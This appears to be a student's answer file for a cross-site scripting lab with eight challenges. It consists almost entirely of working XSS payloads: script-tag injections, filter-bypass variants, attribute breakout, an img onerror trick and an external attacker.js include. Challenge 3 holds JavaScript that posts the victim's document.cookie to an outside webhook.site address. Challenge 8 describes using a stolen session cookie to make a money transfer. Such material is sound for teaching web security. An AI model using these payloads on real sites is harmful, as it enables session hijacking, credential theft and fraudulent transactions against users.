
// Challenge 1: <script>alert(1)</script>
// Challenge 2: <sscriptcript>alert(1)</sscriptcript>
// Challenge 3: PHPSESSID=mag1c_c00k1e
var req = new XMLHttpRequest();
req.open("POST", "https://webhook.site/d6e1cf60-5226-415b-be14-6b0a4e975e5e");
req.setRequestHeader("Access-Control-Allow-Origin", "*");
req.send(document.cookie);
// Challenge 4: <script src="https://cs.utexas.edu/~ryanyz10/attacker.js">
// Challenge 5: red"><script>alert(1)</script>
// Challenge 6: <sscriptcript>aalertlert(1)</sscriptcript>
// Challenge 7: use some element with an onerror attribute, for example an img tag. Point src to some non-existent image, and set the onerror function to alert(1);
// Challenge 8: set PHPSESSID cookie to Skip's cookie, call the php with query ?recipient=Hacker&amount=51537
